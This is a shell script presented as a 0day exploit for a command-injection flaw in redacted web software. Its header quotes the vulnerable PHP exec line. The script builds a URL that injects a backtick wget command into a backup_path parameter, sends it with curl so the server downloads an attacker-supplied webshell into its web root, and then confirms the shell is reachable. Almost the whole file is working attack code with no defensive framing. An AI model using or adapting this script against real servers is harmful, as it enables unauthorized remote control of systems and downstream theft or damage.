#!/bin/sh
# ######################################################################
# ########## This is a 0day exploit for O*********(*********) ##########
# ######################################################################
#
#       Command injection vulnerability in O********* software
#
#                                                             2015.07.31
#                                                     Exploited by 1ndr4
#
# !!!!!!!!!!!!!!!!!!!!       DO NOT DISTRIBUTE      !!!!!!!!!!!!!!!!!!!!
#
# Exploit point:
#
# ... snip ...
# // execute command
# $execMsg = $backup_path."/fullbackup.sh ".$backup_path." >& ".$log_filename." &";
#                                           ^ user input value
# @exec($execMsg); <- point
# ...
echo "###################################################################"
echo "#                                                                 #"
echo "#       Command injection exploit for O*********(*********)       #"
echo "#                                                                 #"
echo "#                                                      2015.07.31 #"
echo "#     This exploit is 0day exploit for O********* (*********)     #"
echo "#                   ! WARNING : DO NOT DISTRIBUTE !               #"
echo "#                                                                 #"
echo "#                                              Exploited by 1ndr4 #"
echo "###################################################################"
echo
if [ "$1" == "" ] || [ "$2" == "" ]; then
	echo "Usage: $0 <TARGET-IP> <WEBSHELL-URL>"
	exit 0
fi
TARGET="$1"
WEBSHELL="$2"
WEBSHELL_NAME="W3BsH3Ll.php"
SERVER_WEBSHELL_PATH="/home/*********/**********/webapp/${WEBSHELL_NAME}"
WEBSHELL_URL="http://$TARGET/***/${WEBSHELL_NAME}"
CHECK_FILE="Attach-Check"
HTTP_REQUEST_CODE="200"

echo "[*] TARGET: $TARGET"
echo "[*] Web Shell: $WEBSHELL"
PAYLOAD="http://$TARGET/***/**/disk/bk******.div.php?backup_path=\`wget%20$WEBSHELL%20-O%20$SERVER_WEBSHELL_PATH\`&execSet=1"
echo "[*] Attack Payload"
echo " > $PAYLOAD"
echo -ne "[*] Exploit: "
curl "${PAYLOAD}" >/dev/null 2>/dev/null
curl ${WEBSHELL_URL} -D ${CHECK_FILE} >/dev/null 2>/dev/null
grep ${HTTP_REQUEST_CODE} ${CHECK_FILE} >/dev/null
if [ "$?" == "0" ]; then
	echo "Success!"
	echo "[*] Visit to this link: ${WEBSHELL_URL}"
else
	echo "Fail!"
fi
rm -rf ${CHECK_FILE}
